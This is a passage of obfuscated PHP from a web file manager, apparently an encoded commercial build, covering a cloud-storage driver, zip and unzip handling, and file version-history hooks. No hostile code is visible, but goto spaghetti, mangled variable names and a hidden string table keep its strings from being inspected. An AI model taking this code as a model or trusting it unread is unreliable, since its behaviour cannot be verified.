$Cƒå“ÓÊô¯ = $this->multiUploadAuthData($AğÌŒ×ÚÍ, $fµ ÖÍ†Ş‚); if (empty($Cƒå“ÓÊô¯)) { return !1; } return array($fÌ‘°İ”Ô”[230] => $Cƒå“ÓÊô¯, $fÌ‘°İ”Ô”[220] => $fµ ÖÍ†Ş‚[$fÌ‘°İ”Ô”[220]], $fÌ‘°İ”Ô”[232] => $Cô¤Áš†Ÿå); goto a¨˜ğ×Ï¾é; a¨˜ğ×Ï¾é: } public function getHost() { return parent::getHost() . $_SERVER[ç][8] . $this->bucket; } public function size($B¤ìì‚óµ) { $FÑİñ´ˆë = $this->objectMeta($B¤ìì‚óµ); return $FÑİñ´ˆë ? $FÑİñ´ˆë[$_SERVER[ç][77]] : 0; } public function info($C¥·ÜÍí„) { if ($this->isFolder($C¥·ÜÍí„)) { return $this->folderInfo($C¥·ÜÍí„); } else { if ($this->isFile($C¥·ÜÍí„)) { return $this->fileInfo($C¥·ÜÍí„); } } return !1; } public function exist($f‹¡ŠĞåÕ) { return $this->isFile($f‹¡ŠĞåÕ) || $this->isFolder($f‹¡ŠĞåÕ); } public function isFile($e½œÆùÖ†…) { return !$this->isFolder($e½œÆùÖ†…) && $this->objectMeta($e½œÆùÖ†…); } public function isFolder($f¤Âè´Ñ£) { return $this->cacheMethod($_SERVER[ç][197], $f¤Âè´Ñ£); } protected function objectMeta($d¹†ËŠ³¹Ì) { return $this->cacheMethod($_SERVER[ç][198], $d¹†ËŠ³¹Ì); } protected function _objectMeta($d™ÕÄ„ÍÇ) { $F°¿ìÆá¼ã =& $_SERVER[ç]; $d™ÕÄ„ÍÇ = rtrim($d™ÕÄ„ÍÇ, $F°¿ìÆá¼ã[8]); try { $Fø¦Ä¤ÅØ¹ = $this->client->getObjectInfo($this->bucket, $d™ÕÄ„ÍÇ); if (!isset($Fø¦Ä¤ÅØ¹[$F°¿ìÆá¼ã[217]]) && isset($Fø¦Ä¤ÅØ¹[$F°¿ìÆá¼ã[233]])) { $Fø¦Ä¤ÅØ¹[$F°¿ìÆá¼ã[217]] = $Fø¦Ä¤ÅØ¹[$F°¿ìÆá¼ã[233]]; } } catch (Exception $F›¢¶‹ö÷í) { $Fø¦Ä¤ÅØ¹ = !1; } if (!$Fø¦Ä¤ÅØ¹) { } return $Fø¦Ä¤ÅØ¹; } protected function _isFolder($A›ä˜ÀÂ­¸) { goto fõ­˜ùØœ‰; Cßè ä­å: $FÑˆ¾âî¹ = $this->client->getBucket($this->bucket, $A›ä˜ÀÂ­¸, null, 1); if (empty($FÑˆ¾âî¹[$f“†·‰Š¸ñ[196]])) { return !1; } $dÔ‚«Œ˜ÑÕ = $FÑˆ¾âî¹[$f“†·‰Š¸ñ[196]][0][$f“†·‰Š¸ñ[28]]; goto a±œË×ÇÚ; fõ­˜ùØœ‰: $f“†·‰Š¸ñ =& $_SERVER[ç]; $A›ä˜ÀÂ­¸ = rtrim($A›ä˜ÀÂ­¸, $f“†·‰Š¸ñ[8]); if ($A›ä˜ÀÂ­¸ == $f“†·‰Š¸ñ[33] || $A›ä˜ÀÂ­¸ == $f“†·‰Š¸ñ[8]) { return !0; } goto Cßè ä­å; a±œË×ÇÚ: if (substr($dÔ‚«Œ˜ÑÕ, -1) == $f“†·‰Š¸ñ[8]) { return !0; } if (get_path_this($dÔ‚«Œ˜ÑÕ) == get_path_this($A›ä˜ÀÂ­¸)) { return !1; } return !0; goto cƒİ½ğÁŞİ; cƒİ½ğÁŞİ: } } define($_SERVER[ç][234], 1); goto f‘„•Ä§ß; bõ‘±«ø¸÷: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Eç‹Î¢¦Ã¤; if (!$Eç‹Î¢¦Ã¤) { $aäÌò×İ²’ = IO::init($_SERVER[ç][8]); } return $aäÌò×İ²’; } private static function iconvSystem($C®‹ªº¹ªÚ) { return self::local()->iconvSystem($C®‹ªº¹ªÚ); } private static function iconvApp($FÁ»¤·ó¼‘) { return self::local()->iconvApp($FÁ»¤·ó¼‘); } public static function zip($Eô¥Ïø¿ÆÄ, $f¿‚‹œ´ë = "\x7a\x69\160", $F©æ”Ÿ­êÍ = '', $FæÁ…Üä·Á = REPEAT_RENAME) { goto E¤²Šİà¨; f½‰æÕïøÀ: $cÑ¿ÀšŸñ§ = !1; if (!$F©æ”Ÿ­êÍ && $FøÌÌ÷Ö˜->getType() == $fôäô¢Ş×ó[105]) { $d·æ‚õ»Æ = self::zipFileList($Eô¥Ïø¿ÆÄ); } else { $cÑ¿ÀšŸñ§ = $F©æ”Ÿ­êÍ ? $F©æ”Ÿ­êÍ : TEMP_FILES . $fôäô¢Ş×ó[1046] . time() . rand_string(8) . $fôäô¢Ş×ó[8]; mk_dir($cÑ¿ÀšŸñ§); $d·æ‚õ»Æ = self::zipFileList($Eô¥Ïø¿ÆÄ, $cÑ¿ÀšŸñ§); } $bï¤ƒíµæ = $f—éİ·ÔšĞ[$fôäô¢Ş×ó[28]]; goto D—¿³”¼Â; E¤²Šİà¨: $fôäô¢Ş×ó =& $_SERVER[ç]; $FøÌÌ÷Ö˜ = self::init($Eô¥Ïø¿ÆÄ[0][$fôäô¢Ş×ó[75]]); $f—éİ·ÔšĞ = self::info($Eô¥Ïø¿ÆÄ[0][$fôäô¢Ş×ó[75]]); goto f½‰æÕïøÀ; D—¿³”¼Â: if (count($d·æ‚õ»Æ) > 1) { $f»İƒ–‹ƒ” = IO::info(IO::pathFather($f—éİ·ÔšĞ[$fôäô¢Ş×ó[75]])); $bï¤ƒíµæ = $f»İƒ–‹ƒ”[$fôäô¢Ş×ó[28]]; } $aÏ£ÎŠŞ¬¸ = $cÑ¿ÀšŸñ§; if (!$aÏ£ÎŠŞ¬¸) { $aÏ£ÎŠŞ¬¸ = get_path_father($f—éİ·ÔšĞ[$fôäô¢Ş×ó[75]]); if (!$F©æ”Ÿ­êÍ && $FøÌÌ÷Ö˜->getType() == $fôäô¢Ş×ó[105]) { $aÏ£ÎŠŞ¬¸ = get_path_father($FøÌÌ÷Ö˜->path); } $b¤ÎòêŒİ = IO::info($aÏ£ÎŠŞ¬¸); if (!$b¤ÎòêŒİ[$fôäô¢Ş×ó[194]]) { show_json(LNG($fôäô¢Ş×ó[1047]), !1); } } goto F½ê”ß¦ó¤; F½ê”ß¦ó¤: $D²Ñ¨µÜ÷Ø = $aÏ£ÎŠŞ¬¸ . $bï¤ƒíµæ . $fôäô¢Ş×ó[94] . $f¿‚‹œ´ë; $D²Ñ¨µÜ÷Ø = get_filename_auto($D²Ñ¨µÜ÷Ø, $fôäô¢Ş×ó[33], $FæÁ…Üä·Á); $D„Çà¤¼§ = self::iconvSystem($D²Ñ¨µÜ÷Ø); goto fƒÑñ°¹Øñ; fƒÑñ°¹Øñ: foreach ($d·æ‚õ»Æ as $dáˆƒ†Úõå => $FÌİ‡À’‹á) { $d·æ‚õ»Æ[$dáˆƒ†Úõå] = self::iconvSystem($FÌİ‡À’‹á); } KodArchive::create($D„Çà¤¼§, $d·æ‚õ»Æ); if (!IO::exist($D²Ñ¨µÜ÷Ø)) { if ($cÑ¿ÀšŸñ§) { del_dir($cÑ¿ÀšŸñ§); } show_json(LNG($fôäô¢Ş×ó[1048]), !1); } goto d¬˜ÄÄÅœ; B¸Õ²µÑŠ: if (!$CÍÒÇËå‰) { del_dir($cÑ¿ÀšŸñ§); show_json(LNG($fôäô¢Ş×ó[1048]), !1); } del_dir($cÑ¿ÀšŸñ§); return $CÍÒÇËå‰; goto A±‡®¥ô†; d¬˜ÄÄÅœ: if ($F©æ”Ÿ­êÍ || !$cÑ¿ÀšŸñ§) { if ($cÑ¿ÀšŸñ§ && strstr($cÑ¿ÀšŸñ§, TEMP_FILES)) { $AÀç‡„èÁà = $d·æ‚õ»Æ = array(); recursion_dir($aÏ£ÎŠŞ¬¸, $AÀç‡„èÁà, $d·æ‚õ»Æ, 0); foreach ($AÀç‡„èÁà as $C‡ì„ŞµÇ) { del_dir($C‡ì„ŞµÇ); } foreach ($d·æ‚õ»Æ as $C ÈÒ¨ª—‰) { if ($C ÈÒ¨ª—‰ == $D„Çà¤¼§) { continue; } del_file($C ÈÒ¨ª—‰); } } return $D²Ñ¨µÜ÷Ø; } $Ağ©á”¶Ì‚ = self::pathFather($f—éİ·ÔšĞ[$fôäô¢Ş×ó[75]]); $CÍÒÇËå‰ = self::move($D²Ñ¨µÜ÷Ø, $Ağ©á”¶Ì‚, $FæÁ…Üä·Á); goto B¸Õ²µÑŠ; A±‡®¥ô†: } public static function unzip($E¾¢õºÏ÷¯, $bæÂã©‹† = "\x72\145\160\x6c\141\143\145") { goto E·°µç›¡; A™›Â§ÛºÌ: if (!($EŸëùáè’ = parent::info($B½îŸ•¸«))) { show_json(LNG($FâŸÁê™š†[1050]), !1); } if (!($BÅŸÔ®íÌÙ = parent::infoFull($a·‹Ô½À²É))) { $a·‹Ô½À²É = parent::mkdir($a·‹Ô½À²É); $BÅŸÔ®íÌÙ = array($FâŸÁê™š†[75] => $a·‹Ô½À²É); } else { if (isset($BÅŸÔ®íÌÙ[$FâŸÁê™š†[390]]) && trim($BÅŸÔ®íÌÙ[$FâŸÁê™š†[75]], $FâŸÁê™š†[8]) != trim($a·‹Ô½À²É, $FâŸÁê™š†[8])) { $Dé‚‡Å’×à = KodIO::make($BÅŸÔ®íÌÙ[$FâŸÁê™š†[472]]); $F ½Ğ†ƒ‘ = parent::fileNameAuto($Dé‚‡Å’×à, $BÅŸÔ®íÌÙ[$FâŸÁê™š†[28]], REPEAT_RENAME_FOLDER, !0); $a·‹Ô½À²É = parent::mkdir($Dé‚‡Å’×à . $F ½Ğ†ƒ‘); $BÅŸÔ®íÌÙ = array($FâŸÁê™š†[75] => $a·‹Ô½À²É); } } $a·‹Ô½À²É = $BÅŸÔ®íÌÙ[$FâŸÁê™š†[75]]; goto Eô˜ ñ¼åö; E·°µç›¡: $FâŸÁê™š† =& $_SERVER[ç]; $B½îŸ•¸« = $E¾¢õºÏ÷¯[$FâŸÁê™š†[75]]; $a·‹Ô½À²É = $E¾¢õºÏ÷¯[$FâŸÁê™š†[1049]]; goto A™›Â§ÛºÌ; cÏ»Û”½³¸: $d±ß‹ƒ’Â× = KodArchive::extract($C³ç°ª½‡¿, $AŠàç‘òÀŒ . $FâŸÁê™š†[8], $c§‡£–Û£); self::archiveExt(); if (!$d±ß‹ƒ’Â×[$FâŸÁê™š†[1053]]) { show_json($FâŸÁê™š†[1054] . $d±ß‹ƒ’Â×[$FâŸÁê™š†[1055]], !1); } goto a¬ÓŞ½¦†; C–ÀØ„ŞŸŒ: mk_dir($AŠàç‘òÀŒ); $bá­ÚóÕ‰¨ = self::fileExt($EŸëùáè’); $C³ç°ª½‡¿ = $AŠàç‘òÀŒ . $FâŸÁê™š†[94] . $bá­ÚóÕ‰¨; goto BÎŒ²ò²; a¬ÓŞ½¦†: Hook::trigger($FâŸÁê™š†[1056], $AŠàç‘òÀŒ); recursion_dir($AŠàç‘òÀŒ, $AÅÌåèñª®, $dÏÛÊ„ÜŒ, 0); $f¥˜Õ“§—‹ = array_merge($AÅÌåèñª®, $dÏÛÊ„ÜŒ); goto bë¼¯í—³œ; BÎŒ²ò²: if (!@file_exists(self::iconvSystem($C³ç°ª½‡¿))) { $dÀÊ‚ê×š¦ = self::localFilePath($B½îŸ•¸«, $bá­ÚóÕ‰¨); $C³ç°ª½‡¿ = $dÀÊ‚ê×š¦ ? $dÀÊ‚ê×š¦ : parent::download($B½îŸ•¸«, $C³ç°ª½‡¿); } $C³ç°ª½‡¿ = self::iconvSystem($C³ç°ª½‡¿); $c§‡£–Û£ = isset($E¾¢õºÏ÷¯[$FâŸÁê™š†[1051]]) ? $E¾¢õºÏ÷¯[$FâŸÁê™š†[1051]] : $FâŸÁê™š†[1052]; goto cÏ»Û”½³¸; BŞ„–©Ë‘’: return !0; goto F•”‹Áµ½; bë¼¯í—³œ: foreach ($f¥˜Õ“§—‹ as $Eƒ‰ğÀóóÏ) { $Eƒ‰ğÀóóÏ = self::iconvApp($Eƒ‰ğÀóóÏ); self::move($Eƒ‰ğÀóóÏ, $a·‹Ô½À²É, $bæÂã©‹†); } del_dir($AŠàç‘òÀŒ); if (!$dÀÊ‚ê×š¦) { del_file($C³ç°ª½‡¿); } goto BŞ„–©Ë‘’; Eô˜ ñ¼åö: $eÖé”ÓÈ½ê = self::tmpFileName($EŸëùáè’); $AŠàç‘òÀŒ = TEMP_FILES . $eÖé”ÓÈ½ê; del_dir($AŠàç‘òÀŒ); goto C–ÀØ„ŞŸŒ; F•”‹Áµ½: } public static function unzipList($aù®‡”æ¦) { goto A‡©ÌÄçê§; C‘Ü°Ùê¸ƒ: $d£ßïÒ» = self::iconvSystem($d£ßïÒ»); if ($C´ ¨¸•í >= 0) { $cÁš½¨Òá = isset($aù®‡”æ¦[$dÙ¸—ø¦Û[1061]]) ? $aù®‡”æ¦[$dÙ¸—ø¦Û[1061]] : !1; $d”¡µŒŸÑ = isset($aù®‡”æ¦[$dÙ¸—ø¦Û[28]]) ? $aù®‡”æ¦[$dÙ¸—ø¦Û[28]] : $dÙ¸—ø¦Û[33]; KodArchive::filePreview($d£ßïÒ», $C´ ¨¸•í, $cÁš½¨Òá, $d”¡µŒŸÑ); self::archiveExt(); die; } $fÕõ²¯Ï× = KodArchive::listContent($d£ßïÒ»); goto EÜ–‘–¤á; e¥´£º–µ¯: $bÏàÅ¿¯• = json_encode($fÕõ²¯Ï×[$dÙ¸—ø¦Û[1055]]); self::setContent($dÄãºÎË¦, $bÏàÅ¿¯•); if (count($fÕõ²¯Ï×[$dÙ¸—ø¦Û[1055]]) >= $f’‚°äí™‹) { show_json(sprintf(LNG($dÙ¸—ø¦Û[1059]), count($fÕõ²¯Ï×[$dÙ¸—ø¦Û[1055]])), !1); } goto B¤Ñî‘ÚØ‰; B¤Ñî‘ÚØ‰: return $fÕõ²¯Ï×[$dÙ¸—ø¦Û[1055]]; goto eˆ¹“…è­; A‰çÌ»‰óÓ: if (!is_dir($f²áñÈòğâ)) { mk_dir($f²áñÈòğâ); } $d£ßïÒ» = $f²áñÈòğâ . $dÙ¸—ø¦Û[8] . $b³‡ğ¢áÜ; if (!@file_exists(self::iconvSystem($d£ßïÒ»))) { if (isset($aÌ÷¨Â¹Ì)) { url_request($Bæ†§Ü¸ƒ½, $dÙ¸—ø¦Û[1060], $d£ßïÒ»); } else { $EŒøÌÊºî¾ = self::localFilePath($Bæ†§Ü¸ƒ½, $C£íˆ¾Û·); $d£ßïÒ» = $EŒøÌÊºî¾ ? $EŒøÌÊºî¾ : self::download($Bæ†§Ü¸ƒ½, $d£ßïÒ»); } } goto C‘Ü°Ùê¸ƒ; CÆã™÷ò—˜: $b²³Š‡ÕŞÕ = self::info($a®ñ‡¡¨¡„); $C£íˆ¾Û· = self::fileExt($b²³Š‡ÕŞÕ); $fëİ¤àô = self::tmpFileName($b²³Š‡ÕŞÕ); goto C¹Ø±–¶Î; C¹Ø±–¶Î: if (isset($aÌ÷¨Â¹Ì)) { $eçÃô°ĞƒÍ = array($aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[75]], $aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[1057]], $aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[28]]); $b³‡ğ¢áÜ = md5(implode($dÙ¸—ø¦Û[70], $eçÃô°ĞƒÍ)) . $dÙ¸—ø¦Û[94] . get_path_ext($aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[28]]); } else { $eçÃô°ĞƒÍ = array($b²³Š‡ÕŞÕ[$dÙ¸—ø¦Û[28]], $b²³Š‡ÕŞÕ[$dÙ¸—ø¦Û[75]], $b²³Š‡ÕŞÕ[$dÙ¸—ø¦Û[77]]); $b³‡ğ¢áÜ = md5(implode($dÙ¸—ø¦Û[70], $eçÃô°ĞƒÍ)) . $dÙ¸—ø¦Û[94] . $C£íˆ¾Û·; } if ($C´ ¨¸•í == -1) { $dÄãºÎË¦ = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\151\x65\x77\x2f{$fëİ¤àô}\57{$b³‡ğ¢áÜ}\x2e\x6c\157\147"; $f‰¡…ŒÜ¥¸ = self::infoFull($dÄãºÎË¦); if ($f‰¡…ŒÜ¥¸) { $dÄãºÎË¦ = $f‰¡…ŒÜ¥¸[$dÙ¸—ø¦Û[75]]; $bÄ¹†´‡ = self::getContent($dÄãºÎË¦); if ($bÄ¹†´‡) { $bÏàÅ¿¯• = json_decode($bÄ¹†´‡, !0); if (count($bÏàÅ¿¯•) >= $f’‚°äí™‹) { show_json(sprintf(LNG($dÙ¸—ø¦Û[1059]), count($bÏàÅ¿¯•)), !1); } return $bÏàÅ¿¯•; } } else { $dÄãºÎË¦ = self::mkfile($dÄãºÎË¦); } } $f²áñÈòğâ = TEMP_FILES . $fëİ¤àô; goto A‰çÌ»‰óÓ; A‡©ÌÄçê§: $dÙ¸—ø¦Û =& $_SERVER[ç]; $Bæ†§Ü¸ƒ½ = $aù®‡”æ¦[$dÙ¸—ø¦Û[75]]; $C´ ¨¸•í = isset($aù®‡”æ¦[$dÙ¸—ø¦Û[1057]]) ? $aù®‡”æ¦[$dÙ¸—ø¦Û[1057]] : -1; goto Fäé±÷ïõ; EÜ–‘–¤á: self::archiveExt(); del_dir($f²áñÈòğâ); if (!$fÕõ²¯Ï×[$dÙ¸—ø¦Û[1053]]) { show_json($fÕõ²¯Ï×[$dÙ¸—ø¦Û[1055]], !1); } goto e¥´£º–µ¯; Fäé±÷ïõ: $f’‚°äí™‹ = 50000; if (request_url_safe($Bæ†§Ü¸ƒ½)) { $aÌ÷¨Â¹Ì = parse_url_query($Bæ†§Ü¸ƒ½); if (!isset($aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[75]])) { show_json($dÙ¸—ø¦Û[1058], !1); } } $a®ñ‡¡¨¡„ = isset($aÌ÷¨Â¹Ì) ? $aÌ÷¨Â¹Ì[$dÙ¸—ø¦Û[75]] : $Bæ†§Ü¸ƒ½; goto CÆã™÷ò—˜; eˆ¹“…è­: } private static function fileExt($b²Ü»Ãˆ‘¸) { $Aˆá‘ğÎ¼ö =& $_SERVER[ç]; $EË¯©¯¡ö¶ = $b²Ü»Ãˆ‘¸[$Aˆá‘ğÎ¼ö[167]]; if ($EË¯©¯¡ö¶ == $Aˆá‘ğÎ¼ö[1062]) { $AÜ˜Û˜ÛÅ‘ = $Aˆá‘ğÎ¼ö[1063]; if (substr($b²Ü»Ãˆ‘¸[$Aˆá‘ğÎ¼ö[28]], -strlen($AÜ˜Û˜ÛÅ‘)) == $AÜ˜Û˜ÛÅ‘) { $EË¯©¯¡ö¶ = $Aˆá‘ğÎ¼ö[1064]; } } self::archiveExt($EË¯©¯¡ö¶); return $EË¯©¯¡ö¶; } private static function zipFileList($e„õæö¨ô, $fŒŒ¡™ªÔ = false) { $A»¹ùå™‹¾ =& $_SERVER[ç]; $bœ©ğÈªù = array(); foreach ($e„õæö¨ô as $eÓ‡çÄ‹ß¢) { $eæ„ù‘ë— = $eÓ‡çÄ‹ß¢[$A»¹ùå™‹¾[75]]; if ($fŒŒ¡™ªÔ) { $eæ„ù‘ë— = self::copy($eÓ‡çÄ‹ß¢[$A»¹ùå™‹¾[75]], $fŒŒ¡™ªÔ, $A»¹ùå™‹¾[754]); } else { $CÚ£ˆŠ¨î = self::init($eÓ‡çÄ‹ß¢[$A»¹ùå™‹¾[75]]); if ($CÚ£ˆŠ¨î->getType() == $A»¹ùå™‹¾[105]) { $eæ„ù‘ë— = $CÚ£ˆŠ¨î->path; } } if ($eæ„ù‘ë— && self::local()->exist($eæ„ù‘ë—)) { $bœ©ğÈªù[$eÓ‡çÄ‹ß¢[$A»¹ùå™‹¾[75]]] = $eæ„ù‘ë—; } } if (!empty($bœ©ğÈªù)) { return array_values($bœ©ğÈªù); } show_json(LNG($A»¹ùå™‹¾[1028]), !1); } public static function tmpFileName($b íÚ‹™î) { $B‰¸ÃĞÒª¹ =& $_SERVER[ç]; $eò…Å†Ó™ = array($b íÚ‹™î[$B‰¸ÃĞÒª¹[28]], $b íÚ‹™î[$B‰¸ÃĞÒª¹[75]], $b íÚ‹™î[$B‰¸ÃĞÒª¹[77]], $b íÚ‹™î[$B‰¸ÃĞÒª¹[481]]); return md5(implode($B‰¸ÃĞÒª¹[70], $eò…Å†Ó™)); } private static function localFilePath($A„Äé±±ñ, $C‰Ö£İœøÛ) { goto c­´ğƒãòº; Eò–³ß®ù: if ($EÖ˜“áŠŠ[$fÈé®ë³ë[29]] == KodIO::KOD_SOURCE) { $aÓîôã­Á÷ = Model($fÈé®ë³ë[760])->fileInfoGet(KodIO::sourceID($A„Äé±±ñ)); if (!$aÓîôã­Á÷[$fÈé®ë³ë[75]]) { show_json($fÈé®ë³ë[1067], !1); } $A„Äé±±ñ = $aÓîôã­Á÷[$fÈé®ë³ë[75]]; } $dŒğİ²É¹Ó = self::init($A„Äé±±ñ); $C·†°»†£Ş = $dŒğİ²É¹Ó->getType(); goto b”µ¼ÇÖ«Õ; b”µ¼ÇÖ«Õ: if ($C·†°»†£Ş == $fÈé®ë³ë[105] || $C·†°»†£Ş == $fÈé®ë³ë[1068]) { if (!$dŒğİ²É¹Ó->exist($dŒğİ²É¹Ó->path)) { show_json(LNG($fÈé®ë³ë[104]), !1); } return $dŒğİ²É¹Ó->path; } return !1; goto AŠˆ­Í‹±»; c­´ğƒãòº: $fÈé®ë³ë =& $_SERVER[ç]; if ($C‰Ö£İœøÛ == $fÈé®ë³ë[1065] && strtoupper(substr(PHP_OS, 0, 3)) == $fÈé®ë³ë[1066]) { return !1; } $EÖ˜“áŠŠ = KodIO::parse($A„Äé±±ñ); goto Eò–³ß®ù; AŠˆ­Í‹±»: } private static function archiveExt($C¿µÙ·½­Š = '') { $GLOBALS[$_SERVER[ç][1069]] = $C¿µÙ·½­Š; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto b¦„÷¥‰½˜; eÔŞÂ‘İ…“: Hook::bind($C™ƒÆ¸ºšÌ[1076], $C™ƒÆ¸ºšÌ[1077]); Hook::bind($C™ƒÆ¸ºšÌ[1078], $C™ƒÆ¸ºšÌ[1079]); Hook::bind($C™ƒÆ¸ºšÌ[1080], $C™ƒÆ¸ºšÌ[1081]); goto fĞŞ÷’‚†Ÿ; b¦„÷¥‰½˜: $C™ƒÆ¸ºšÌ =& $_SERVER[ç]; $f‰à½ß¨òˆ = $GLOBALS[$C™ƒÆ¸ºšÌ[6]][$C™ƒÆ¸ºšÌ[87]][$C™ƒÆ¸ºšÌ[1070]]; if ($f‰à½ß¨òˆ <= 0) { return; } goto Eğò•¶Ú¸‘; Eğò•¶Ú¸‘: if (isset($_REQUEST[$C™ƒÆ¸ºšÌ[1071]]) && $_REQUEST[$C™ƒÆ¸ºšÌ[1071]] == $C™ƒÆ¸ºšÌ[86]) { return; } Hook::bind($C™ƒÆ¸ºšÌ[1072], $C™ƒÆ¸ºšÌ[1073]); Hook::bind($C™ƒÆ¸ºšÌ[1074], $C™ƒÆ¸ºšÌ[1075]); goto eÔŞÂ‘İ…“; fĞŞ÷’‚†Ÿ: Hook::bind($C™ƒÆ¸ºšÌ[1082], $C™ƒÆ¸ºšÌ[1083]); goto DŠëË¤·˜”; DŠëË¤·˜”: } public static function eventBeforeUpload($BîÉÇ¶Ñ¹) { if ($BîÉÇ¶Ñ¹[3] && $BîÉÇ¶Ñ¹[3] != REPEAT_REPLACE) { return; } $bƒèìèˆ¦‡ = self::parsePath($BîÉÇ¶Ñ¹[0]); if (!$bƒèìèˆ¦‡) { return; } self::add($bƒèìèˆ¦‡); } public static function eventBeforeEdit($EŒ”šì´À) { $f“Å«Ì¥öÔ = self::parsePath($EŒ”šì´À[0]); if (!$f“Å«Ì¥öÔ) { return; } self::add($f“Å«Ì¥öÔ); } public static function eventBeforeCopyFile($F‘«•­îÚ¢, $e„¶µÖ¡îõ, $f…±…™‰ó¸, $bŒ’îŒ­Ë³, $D¾¿á©ÛÀ, $ağÛê‰À÷) { $f»âŠàìÜ = $f…±…™‰ó¸->getPathOuter($bŒ’îŒ­Ë³); $EÊÈÒ–¾¯‹ = self::parsePath($f»âŠàìÜ); if (!$EÊÈÒ–¾¯‹) { return; } self::add($EÊÈÒ–¾¯‹); } public static function eventBeforeRename($eö¯¯‚•Ü¹) { $eëã•ÜÓÒˆ =& $_SERVER[ç]; $F…‘Ü‡‘â» = self::parsePath($eö¯¯‚•Ü¹[0]); if (!$F…‘Ü‡‘â») { return; } $d¹ìÉ±»½Ø = self::checkInHistory($F…‘Ü‡‘â»); if (!$d¹ìÉ±»½Ø) { return; } if ($d¹ìÉ±»½Ø[$eëã•ÜÓÒˆ[29]] == $eëã•ÜÓÒˆ[173]) { $Fò¯òÕµ¼¾ = self::listData($F…‘Ü‡‘â»); if ($Fò¯òÕµ¼¾ && $Fò¯òÕµ¼¾[$eëã•ÜÓÒˆ[365]]) { self::moveHistory($F…‘Ü‡‘â», $eö¯¯‚•Ü¹[1]); } } else { IO::rename($d¹ìÉ±»½Ø[$eëã•ÜÓÒˆ[75]], $eö¯¯‚•Ü¹[1]); } } public static function eventBeforeMove($cï®Š‡ÛÈç) { goto E†ƒ¦ù«¡; BÙ”é®œêÓ: $DÊÊ¸ö¨³ = self::parsePath($cï®Š‡ÛÈç[1]); if (!$DÊÊ¸ö¨³) { return; } $c«êĞÔ‘”§ = $cï®Š‡ÛÈç[3]; goto bî†¯ÖÈ«Ì; cåĞ¦ÑŒ‰…: if ($F›øÍˆ‚‰[$DàƒšîæŠè[29]] == $DàƒšîæŠè[173]) { $c—·‰Äë¨¦ = self::listData($Cª¹Çßù–“); $D™…±Ì§Ù© = rtrim($DÊÊ¸ö¨³, $DàƒšîæŠè[8]) . $DàƒšîæŠè[8] . ($c«êĞÔ‘”§ ? $c«êĞÔ‘”§ : get_path_this($Cª¹Çßù–“)); $BìÉÈºÂ”Ó = self::listData($D™…±Ì§Ù©); if ($c—·‰Äë¨¦ && $c—·‰Äë¨¦[$DàƒšîæŠè[365]] && $BìÉÈºÂ”Ó && $BìÉÈºÂ”Ó[$DàƒšîæŠè[365]]) { return self::clear($Cª¹Çßù–“); } if ($c—·‰Äë¨¦ && $c—·‰Äë¨¦[$DàƒšîæŠè[365]]) { self::moveHistory($Cª¹Çßù–“, $c«êĞÔ‘”§, $EÎ§†ƒòÏ); } } else { IO::move($F›øÍˆ‚‰[$DàƒšîæŠè[75]], $EÎ§†ƒòÏ, !1, $c«êĞÔ‘”§); self::clearEmptyFolder(IO::pathFather($F›øÍˆ‚‰[$DàƒšîæŠè[75]])); } goto eößÑè»ËÂ; bî†¯ÖÈ«Ì: $F›øÍˆ‚‰ = self::checkInHistory($Cª¹Çßù–“); if (!$F›øÍˆ‚‰) { return; } $EÎ§†ƒòÏ = self::pathHistory($DÊÊ¸ö¨³); goto cåĞ¦ÑŒ‰…; E†ƒ¦ù«¡: $DàƒšîæŠè =& $_SERVER[ç]; $Cª¹Çßù–“ = self::parsePath($cï®Š‡ÛÈç[0]); if (!$Cª¹Çßù–“) { return; } goto BÙ”é®œêÓ; eößÑè»ËÂ: } public static function eventAfterRemove($A…Âõ¹ š, $F²ë´ŞÚ£‡) { goto EÈØÎùŞòß; f†¡›”‚½Ö: if ($f¡æˆÕŒ¸ñ[$c±åŠê—Ù‡[29]] == $c±åŠê—Ù‡[173]) { $F÷…ÇÖÙğ‚ = self::listData($C“Âğ¼«“, !1); if ($F÷…ÇÖÙğ‚ && $F÷…ÇÖÙğ‚[$c±åŠê—Ù‡[365]]) { self::clear($C“Âğ¼«“, !1); } } else { IO::remove($f¡æˆÕŒ¸ñ[$c±åŠê—Ù‡[75]]); self::clearEmptyFolder(IO::pathFather($f¡æˆÕŒ¸ñ[$c±åŠê—Ù‡[75]])); } goto F­Ò¯†·; EÈØÎùŞòß: $c±åŠê—Ù‡ =& $_SERVER[ç]; if (!$F²ë´ŞÚ£‡) { return; } $C“Âğ¼«“ = self::parsePath($A…Âõ¹ š[0]); goto F¿£µ¶Ò‚; F¿£µ¶Ò‚: if (!$C“Âğ¼«“) { return; } $f¡æˆÕŒ¸ñ = self::checkInHistory($C“Âğ¼«“); if (!$f¡æˆÕŒ¸ñ) { return; } goto f†¡›”‚½Ö; F­Ò¯†·: } private static function checkInHistory($C²¨¬¿ÛŒ¹) { $F„Ä ¢ğ° = self::pathHistory($C²¨¬¿ÛŒ¹); if (!IO::exist($F„Ä ¢ğ°)) { $F„Ä ¢ğ° .= $_SERVER[ç][1084]; } return IO::exist($F„Ä ¢ğ°) ? IO::info($F„Ä ¢ğ°) : !1; } private static function parsePath($Eæ®„ê™Á) { goto D«ÇÈõ¦Ş; a×Ï‰ğ¿ë“: if (!$eŞÁ¿¥“‚ || !$E¥ŒĞÃ±ğ¢[$b³ĞŠÉ³µ[1086]]) { return !1; } if ($e²‹‹³®ÁÄ == KodIO::KOD_SHARE_ITEM) { $A›¢Š½Ê¬ = IO::init($Eæ®„ê™Á); if ($A›¢Š½Ê¬->pathParse[$b³ĞŠÉ³µ[1015]]) { return self::parsePath($A›¢Š½Ê¬->pathParse[$b³ĞŠÉ³µ[1015]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto D¼ÈÆÆ¿; D¦àÇÑéº: return $Eæ®„ê™Á; goto BÖ†Ğ³µ¯; D«ÇÈõ¦Ş: $b³ĞŠÉ³µ =& $_SERVER[ç]; if (!$Eæ®„ê™Á) { return !1; } if ($GLOBALS[$b³ĞŠÉ³µ[1085]]) { return; } goto fÑäõ„ğÚ; D¼ÈÆÆ¿: $E±¯à™§à = array(self::$_historyBase, 